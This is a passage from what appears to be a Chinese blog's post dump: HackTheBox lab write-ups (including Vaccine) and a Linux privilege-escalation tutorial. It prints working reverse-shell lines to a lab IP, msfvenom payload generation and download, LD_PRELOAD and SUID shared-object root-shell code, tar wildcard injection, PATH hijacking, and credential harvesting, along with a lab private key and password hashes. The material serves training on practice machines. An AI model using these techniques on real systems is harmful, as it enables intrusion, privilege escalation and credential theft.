the priceless originals\nfind source_images -type f -name &#39;*.jpg&#39; -exec chown root:root &#123;&#125; \\;这里使用到的是相对路径而不是绝对路径\n\n在当前目录创建一个find文件，里面写一个shell，将环境变量改为当前目录，sudo执行cleanup.sh\n\n拿到root权限shell ，得到rootflag：bad337481d54051abd1e86a01ce42933\n\n环境变量提权，相关链接https://juejin.cn/post/7165030726461718535\n\n","tags":["打靶","HTB"]},{"title":"Vaccine靶机","url":"/2023/02/10/Vaccine%E9%9D%B6%E6%9C%BA/","content":"流程概述： FTP匿名攻击 —&gt; zip2john破解hash值得到密码 —&gt;web源码信息泄露—&gt;登录web后台 —&gt;sql注入攻击—&gt;反弹shell拿到权限—&gt; vi提权root\n\n\nnmap扫端口\n\n利用anonymous用户，ftp连接主机\n\nget下来backup.zip文件\n解压时发现需要密码，利用john得到hash进行破解\n\n拿到解压密码，解压查看index.php文件\n\n找到admin用户MD5密码\nMD5碰撞拿到明文密码\n\n登录网页\n\n有个搜索框，想到sql注入，输入1‘，果然报错，确定为sql注入，抓包sqlmap一把梭\n\n将数据包放入一个文件\n\n扫出为postgresql数据库，直接–os-shell拿shell，这里出现问题，谷歌搜了一下，很多人在这出错，应该是靶机的问题\nhttps://forum.hackthebox.com/t/machine-name-vaccine-stuck-on-getting-sql-code-execution-shell/2513\n在GitHub上找到个师傅写的EXP：https://github.com/florianges/-HTB-Vaccine_sql_injection\n脚本描述很清楚，将信息修改\n在本地跑个80端口提供nc的下载，在这之前要将nc放入你跑服务的目录下(cp /bin/nc.traditional ~/Desktop/nc)\n\n本地开启nc监听\n\n跑脚本\n\n这个脚本实际就是通过注入创建相应的表、字段，从程序中复制数据到这个字段表里，然后后面下载nc，赋予nc执行权限，并且执行反弹shell命令。\n\n拿到user flag\n\n在dashboard.php文件发现用户名postgres密码P@s5w0rd!\nssh连接主机\nsudo -l 查看用户能执行的高权限命令\n\n发现postgres账号可以以root权限运行vi，在vi中是可以调用shell的。\n执行命令以root权限打开vi sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n按: 进入命令模式，输入!&#x2F;bin&#x2F;bash,命令含义为以shell命令的方式执行 /bin/bash，也就是打开一个交互式终端。感叹号为强制执行。\n在我们执行vi时，会调用shell,由于vi是以root权限执行的，那么调用的shell也是root权限下的\n\n得到root flag\n","tags":["打靶","HTB"]},{"title":"Hello World","url":"/2024/04/12/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"linux提权","url":"/2023/02/25/linux%E6%8F%90%E6%9D%83/","content":"前言  这里通过简单靶场举例说明，了解提权的基础姿势。\n\n\n提权检测脚本  在拿到普通用户shell后，可以手动输入命令2来查询系统信息、用户信息、正在运行的服务、第三方软件等等可能用来提权的点。同时，也可以利用现成的收集脚本来进行收集，这里介绍linpeas脚本，链接如下：https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS。阅读官方文档，此脚本可以收集到系统信息、驱动器、已安装软件、进程信息、定时作业、服务等等信息。还有其他一些脚本，原理大同小异，这里不做介绍了。\n\nLinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\nLinEnum: https://github.com/rebootuser/LinEnum\nLES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester\nLinux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration\nLinux Priv Checker: https://github.com/linted/linuxprivchecker\n\nsudo提权命令提权  默认情况下，sudo命令允许用户以root权限执行命令&#x2F;运行程序，某些情况下，系统管理员会允许普通用户提供一些灵活的权限，例如，普通用户需要使用nmap，而又不想让普通用户得到完全的root权限，此时，root用户可以允许普通用户仅以root权限运行这个程序，在其他应用程序维持原来的权限级别。\n  任何用户都可以使用sudo -l命令查看当前与root权限相关的情况。\nuser@debian:~$ sudo -l\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\nUser user may run the following commands on this host:\n    (root) NOPASSWD: /usr/sbin/iftop\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /usr/bin/nano\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/man\n    (root) NOPASSWD: /usr/bin/awk\n    (root) NOPASSWD: /usr/bin/less\n    (root) NOPASSWD: /usr/bin/ftp\n    (root) NOPASSWD: /usr/bin/nmap\n    (root) NOPASSWD: /usr/sbin/apache2\n    (root) NOPASSWD: /bin/more\n\n  在此例中，有11个命令允许以root权限执行，因此我们可以尝试使用此命令的某些功能来获得特权 shell。可以通过查阅此网站来查询各种命令提权的使用方法https://gtfobins.github.io/。例如，这里我们使用find命令来进行sudo提权。\nuser@debian:~$ sudo find . -exec /bin/sh \\; -quit\nsh-4.1# whoami\nroot\nsh-4.1# id\nuid=0(root) gid=0(root) groups=0(root)\nsh-4.1# \n\n环境变量  如果您在 sudo -l 的输出中发现以下句子：env_keep+&#x3D;LD_PRELOAD 并且您可以使用 sudo 调用一些命令，则可以提升权限。如下：\nuser@debian:~$ sudo -l\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\nUser user may run the following commands on this host:\n\n  LD_PRELOAD 和 LD_LIBRARY_PATH 都继承自用户环境。LD_PRELOAD 在程序运行时先加载一个共享对象。 LD_LIBRARY_PATH 提供首先搜索共享库的目录列表。也就是说，如果攻击者控制 LD_LIBRARY_PATH env 变量，则可能会滥用类似的权限，因为他控制着要搜索库的路径。通过改变环境变量，使得程序运行时执行我们的恶意文件。\n  另存为&#x2F;tmp&#x2F;pe.c\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() &#123;\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    setgid(0);\n    setuid(0);\n    system(&quot;/bin/bash&quot;);\n&#125;\n\n  然后编译它使用：\ncd /tmp\ngcc -fPIC -shared -o pe.so pe.c -nostartfiles\n\n  最后运行提权\nsudo LD_PRELOAD=./pe.so &lt;COMMAND&gt; #Use any command you can run with sudo\n\n例如：\nuser@debian:~$ vim /tmp/pe.c\nuser@debian:~$ cd /tmp\nuser@debian:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles\nuser@debian:/tmp$ sudo LD_PRELOAD=./pe.so apache2\nroot@debian:/tmp# \n\n注意最后一行已经变成了root权限shell\nCron作业  Cron作业用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者而非当前用户的权限运行。\n文件权限  如果有一个以 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行。\n  Cron 表文件 (crontabs) 存储 cron 作业的配置。crontab 位于 &#x2F;etc&#x2F;crontab。查看此文件：\nuser@debian:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don&#39;t have to run the `crontab&#39;\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\n\n  可以看到有两个计划运行的作业，一个为overwrite.sh，另一个为&#x2F;usr&#x2F;local&#x2F;bin&#x2F;compress.sh。\n  找到overwrite.sh文件所在位置，并查看此文件权限\nuser@debian:~$ locate overwrite.sh\nlocate: warning: database `/var/cache/locate/locatedb&#39; is more than 8 days old (actual age is 1016.0 days)\n/usr/local/bin/overwrite.sh\nuser@debian:~$ ls -l /usr/local/bin/overwrite.sh\n-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh\n\n  可以看到，文件位于&#x2F;usr&#x2F;local&#x2F;bin&#x2F;overwrite.sh，并且全局可写，那么我们就可以将此文件内容更改。\n  将文件内容改为反弹shell的命令\n!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.18.47.107/4444 0&gt;&amp;1\n\n  本机开启监听，等待cron作业执行\n┌──(n3ym4r㉿kali)-[~]\n└─$ nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.18.47.107] from (UNKNOWN) [10.10.80.4] 38638\nbash: no job control in this shell\nroot@debian:~# \n\n  得到root权限\nPATH 环境变量在&#x2F;etc&#x2F;crontab文件可以看到，PATH为PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin，我们可以在&#x2F;home&#x2F;user目录下新建一个overwrite.sh脚本如下：\n#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\n\n  然后，确保此脚本有执行权限：chmod +x /home/user/overwrite.sh\n  等待系统执行作业，使用 -p 运行 &#x2F;tmp&#x2F;rootbash 命令以获得以 root 权限运行的 shell\nuser@debian:~$ /tmp/rootbash -p\nrootbash-4.1# whoami\nroot\n\n通配符查看另一个作业文件\nsh-4.1$ cat /usr/local/bin/compress.sh \n#!/bin/sh\ncd /home/user\ntar czf /tmp/backup.tar.gz *\nsh-4.1$ \n\n可以看到脚本命令为切换到&#x2F;home&#x2F;user目录下，然后把目录里的所有文件都压缩，生成一个压缩包，命名为backup.tar.gz。\n通过查阅https://gtfobins.github.io/gtfobins/tar/，得到`tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null –checkpoint&#x3D;1 –checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh&#96;使用此命令可拿到shell。\n那么可以在目录下新建两个文件\n首先在本地使用msf生成shell.elf\n┌──(n3ym4r㉿kali)-[~]\n└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.47.107 LPORT=9999 -f elf -o shell.elf\n\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\nSaved as: shell.elf\n\n然后，在本地开一个server\n┌──(n3ym4r㉿kali)-[~]shell\n└─$ python3 -m http.server 80      \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n127.0.0.1 - - [25/Feb/2023 19:21:08] &quot;GET / HTTP/1.1&quot; 200 -\n127.0.0.1 - - [25/Feb/2023 19:21:09] code 404, message File not found\n127.0.0.1 - - [25/Feb/2023 19:21:09] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -\n10.10.80.4 - - [25/Feb/2023 19:22:41] &quot;GET /shell.elf HTTP/1.0&quot; 200 -\n\n在主机下载\nuser@debian:~$ wget http://10.18.47.107/shell.elf\n--2023-02-25 06:22:40--  http://10.18.47.107/shell.elf\nConnecting to 10.18.47.107:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 194 [application/octet-stream]\nSaving to: “shell.elf”\n\n100%[============================================================================&gt;] 194         --.-K/s   in 0s      \n\n2023-02-25 06:22:41 (60.0 MB/s) - “shell.elf” saved [194/194]\n\n赋予执行权限\nuser@debian:~$ chmod +x /home/user/shell.elf\n\n在home&#x2F;user下，新建两个文件\nuser@debian:~$ touch /home/user/--checkpoint=1\nuser@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf\n\n之后，等待作业执行，得到反弹shell\n这里，简单解释一下，作业会执行tar命令，我们在目录下新建两个文件，将命名改为tar可执行的命令，也就是说会把这两个文件的名称当做命令来执行，而不是作为文件。\nSUIDsuid即set user id，是一种授予文件的权限类型，它允许用户使用者以文件所有者的权限来执行文件。需要这种特殊权限的场景在Linux下很常见。\n使用find / -perm -4000 2&gt;/dev/null 即可获得所有suid可执行文件\nuser@debian:~$ find / -perm -4000 2&gt;/dev/null \n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/sudoedit\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/local/bin/suid-so\n/usr/local/bin/suid-env\n/usr/local/bin/suid-env2\n/usr/sbin/exim-4.84-3\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/bin/ping6\n/bin/ping\n/bin/mount\n/bin/su\n/bin/umount\n/tmp/rootbash\n/sbin/mount.nfs\nuser@debian:~$\n\n已知漏洞在上面的查询中可以看到/usr/sbin/exim-4.84-3，在Google，GitHub，exploit-db查询此版本有无漏洞。查询得到存在 CVE-2016-1531漏洞，利用现成exp进行漏洞利用。\nuser@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh\n[ CVE-2016-1531 local root exploit\nsh-4.1# id\nuid=0(root) gid=1000(user) groups=0(root)\n\n共享对象注入/usr/local/bin/suid-so SUID 可执行文件容易受到共享对象注入的攻击。\nuser@debian:~$ /usr/local/bin/suid-so              //执行此文件，会出现进度条\nCalculating something, please wait...\n[=====================================================================&gt;] 99 %\nDone.\nuser@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot; //在文件上运行 strace 并在输出中搜索打开/访问调用和“没有这样的文件”错误\naccess(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\naccess(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3\nopen(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  //最后一行，可执行文件试图在我们的主目录中加载 /home/user/.config/libcalc.so 共享对象，但找不到。\nuser@debian:~$ mkdir /home/user/.config                    //为 libcalc.so 文件创建 .config 目录\nuser@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c   //将/home/user/tools/suid/libcalc.c编译到 suid-so 可执行文件查找它的位置的共享对象中\nuser@debian:~$ /usr/local/bin/suid-so           //再次执行 suid-so 可执行文件，注意这次我们得到的不是进度条，而是 root shell\nCalculating something, please wait...\nbash-4.1# id\nuid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\nbash-4.1# \n\nlibcalc.c:\nbash-4.1# cat /home/user/tools/suid/libcalc.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() &#123;\n    setuid(0);\n    system(&quot;/bin/bash -p&quot;);\n&#125;\n\n环境变量/usr/local/bin/suid-env 可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序。\nuser@debian:~$ /usr/local/bin/suid-env          //执行文件，发现正在尝试启动Apache2服务\n[....] Starting web server: apache2httpd (pid 1625) already running\n. ok \nuser@debian:~$ strings /usr/local/bin/suid-env    //在文件上运行字符串以查找可打印字符的字符串：\n/lib64/ld-linux-x86-64.so.2\n5q;Xq\n__gmon_start__\nlibc.so.6\nsetresgid\nsetresuid\nsystem\n__libc_start_main\nGLIBC_2.2.5\nfff.\nfffff.\nl$ L\nt$(L\n|$0H\nservice apache2 start  //这一行表明正在调用服务可执行文件以启动网络服务器，但是未使用可执行文件的完整路径（/usr/sbin/service）。\nuser@debian:~$ gcc -o service /home/user/tools/suid/service.c  //编译准备好的service文件\nuser@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env //将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量，并运行 suid-envexecutable\nroot@debian:~# id                                   //得到root权限\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nservice.c:\nroot@debian:~# cat /home/user/tools/suid/service.c \nint main() &#123;\n    setuid(0);\n    system(&quot;/bin/bash -p&quot;);\n&#125;\n\n滥用shellbash&lt;4.2-048在 Bash 版本 &lt;4.2-048 中，可以使用类似于文件路径的名称定义 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。\nuser@debian:~$ /bin/bash --version                     //获取bash版本\nGNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)\nCopyright (C) 2009 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nuser@debian:~$ function /usr/sbin/service &#123; /bin/bash -p; &#125;     \n//创建一个名为“/usr/sbin/service”的 Bash 函数，它执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数\nuser@debian:~$ export -f /usr/sbin/service \nuser@debian:~$ /usr/local/bin/suid-env2 //运行得到root shell \nroot@debian:~# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\nroot@debian:~# \n\nbash&lt;4.4在调试模式下，Bash 使用环境变量 PS4 来显示调试语句的额外提示。\nuser@debian:~$ env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2\n //在启用 bash 调试的情况下运行 /usr/local/bin/suid-env2 可执行文件，并将 PS4 变量设置为创建 SUID 版本 /bin/bash 的嵌入式命令\n \n/usr/sbin/service apache2 start\nbasename /usr/sbin/service\nVERSION=&#39;service ver. 0.91-ubuntu1&#39;\nbasename /usr/sbin/service\nUSAGE=&#39;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#39;\nSERVICE=\nACTION=\nSERVICEDIR=/etc/init.d\nOPTIONS=\n&#39;[&#39; 2 -eq 0 &#39;]&#39;\ncd /\n&#39;[&#39; 2 -gt 0 &#39;]&#39;\ncase &quot;$&#123;1&#125;&quot; in\n&#39;[&#39; -z &#39;&#39; -a 2 -eq 1 -a apache2 = --status-all &#39;]&#39;\n&#39;[&#39; 2 -eq 2 -a start = --full-restart &#39;]&#39;\n&#39;[&#39; -z &#39;&#39; &#39;]&#39;\nSERVICE=apache2\nshift\n&#39;[&#39; 1 -gt 0 &#39;]&#39;\ncase &quot;$&#123;1&#125;&quot; in\n&#39;[&#39; -z apache2 -a 1 -eq 1 -a start = --status-all &#39;]&#39;\n&#39;[&#39; 1 -eq 2 -a &#39;&#39; = --full-restart &#39;]&#39;\n&#39;[&#39; -z apache2 &#39;]&#39;\n&#39;[&#39; -z &#39;&#39; &#39;]&#39;\nACTION=start\nshift\n&#39;[&#39; 0 -gt 0 &#39;]&#39;\n&#39;[&#39; -r /etc/init/apache2.conf &#39;]&#39;\n&#39;[&#39; -x /etc/init.d/apache2 &#39;]&#39;\nexec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start\nStarting web server: apache2httpd (pid 1625) already running\n.\nuser@debian:~$ \nuser@debian:~$ /tmp/rootbash -p      //使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell\n\nrootbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n密码、秘钥历史文件如果用户不小心在命令行而不是在密码提示中输入密码，则可能会记录在历史文件中。\ncat ~/.*history    //查看user home下所有隐藏历史文件的内容\n\nuser@debian:~$ cat ~/.*history\nls -al\ncat .bash_history \nls -al\nmysql -h somehost.local -uroot -ppassword123  //暴露出mysql密码\nexit\ncd /tmp\nclear\nifconfig\nnetstat -antp\nnano myvpn.ovpn \n\n配置文件配置文件通常包含明文或其他可逆格式的密码。\nuser@debian:~$ ls /home/user\nmyvpn.ovpn  service  tools\nuser@debian:~$ \nuser@debian:~$ cat /home/user/myvpn.ovpn   //注意 myvpn.ovpn 配置文件的存在。查看文件内容\nclient\ndev tun\nproto udp\nremote 10.10.10.10 1194\nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nca ca.crt\ntls-client\nremote-cert-tls server \nauth-user-pass /etc/openvpn/auth.txt         //该文件应包含另一个文件的引用\ncomp-lzo\nverb 1\nreneg-sec 0\n\n\nuser@debian:~$ cat /etc/openvpn/auth.txt      //查看该文件\nroot\npassword123\nuser@debian:~$ su root                        //凭借密码登录到root\nPassword: \nroot@debian:/home/user# id\nuid=0(root) gid=0(root) groups=0(root)\n\nSSH秘钥有时用户会备份重要文件，但无法使用正确的权限来保护它们。\nuser@debian:~$ ls -la /                                      //在系统根目录中查找隐藏的文件和目录\ntotal 96\ndrwxr-xr-x 22 root root  4096 Aug 25  2019 .\ndrwxr-xr-x 22 root root  4096 Aug 25  2019 ..\ndrwxr-xr-x  2 root root  4096 Aug 25  2019 bin\ndrwxr-xr-x  3 root root  4096 May 12  2017 boot\ndrwxr-xr-x 12 root root  2820 Feb 25 08:27 dev\ndrwxr-xr-x 67 root root  4096 Feb 25 09:19 etc\ndrwxr-xr-x  3 root root  4096 May 15  2017 home\nlrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -&gt; boot/initrd.img-2.6.32-5-amd64\ndrwxr-xr-x 12 root root 12288 May 14  2017 lib\nlrwxrwxrwx  1 root root     4 May 12  2017 lib64 -&gt; /lib\ndrwx------  2 root root 16384 May 12  2017 lost+found\ndrwxr-xr-x  3 root root  4096 May 12  2017 media\ndrwxr-xr-x  2 root root  4096 Jun 11  2014 mnt\ndrwxr-xr-x  2 root root  4096 May 12  2017 opt\ndr-xr-xr-x 96 root root     0 Feb 25 08:25 proc\ndrwx------  5 root root  4096 May 15  2020 root\ndrwxr-xr-x  2 root root  4096 May 13  2017 sbin\ndrwxr-xr-x  2 root root  4096 Jul 21  2010 selinux\ndrwxr-xr-x  2 root root  4096 May 12  2017 srv\ndrwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh\ndrwxr-xr-x 13 root root     0 Feb 25 08:25 sys\ndrwxrwxrwt  2 root root  4096 Feb 25 09:25 tmp\ndrwxr-xr-x 11 root root  4096 May 13  2017 usr\ndrwxr-xr-x 14 root root  4096 May 13  2017 var\nlrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -&gt; boot/vmlinuz-2.6.32-5-amd64\nuser@debian:~$ ls -l /.ssh                                 //查看.ssh\ntotal 4\n-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key\nuser@debian:~$ cat /.ssh/root_key                          //进一步查看，确定为ssh登录私钥\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm\ngLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl\np4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo\nOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD\neV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET\nZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2\nNiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ\nYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+\n5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el\nWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7\nVDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7\n6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW\n1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K\n824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6\nWg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc\nU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1\nRg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi\nSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV\nd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im\njQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa\n871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok\nX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4\nCLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN\nWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4\nLnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==\n-----END RSA PRIVATE KEY-----\n\n将私钥复制，放入本地主机，利用私钥登录ssh root账户\n┌──(n3ym4r㉿kali)-[~]\n└─$ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.183.54\n//这里因为靶机太老，需要做些额外的设置\n\n弱文件可读&#x2F;etc&#x2F;shadow&#x2F;etc&#x2F;shadow 文件包含用户的密码哈希值，通常只有 root 用户可读，如果普通用户也能对etc&#x2F;shadow 文件进行读取，那么我们就能利用可读的&#x2F;etc&#x2F;shadow提权。\nuser@debian:~$ ls -l /etc/shadow                     //查看权限\n-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow\nuser@debian:~$ cat /etc/shadow\nroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::\ndaemon:*:17298:0:99999:7:::\nbin:*:17298:0:99999:7:::\nsys:*:17298:0:99999:7:::\nsync:*:17298:0:99999:7:::\ngames:*:17298:0:99999:7:::\nman:*:17298:0:99999:7:::\nlp:*:17298:0:99999:7:::\nmail:*:17298:0:99999:7:::\nnews:*:17298:0:99999:7:::\nuucp:*:17298:0:99999:7:::\nproxy:*:17298:0:99999:7:::\nwww-data:*:17298:0:99999:7:::\nbackup:*:17298:0:99999:7:::\nlist:*:17298:0:99999:7:::\nirc:*:17298:0:99999:7:::\ngnats:*:17298:0:99999:7:::\nnobody:*:17298:0:99999:7:::\nlibuuid:!:17298:0:99999:7:::\nDebian-exim:!:17298:0:99999:7:::\nsshd:*:17298:0:99999:7:::\nuser:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::\nstatd:*:17299:0:99999:7:::\nmysql:!:18133:0:99999:7:::\nuser@debian:~$ \n\n在每行的第二个参数就是保存的密码hash(如果有的话)\n得到hash后，使用本地kali的john进行密码枚举，得到明文密码\n可写&#x2F;etc&#x2F;shadowuser@debian:~$ mkpasswd -m sha-512 1234       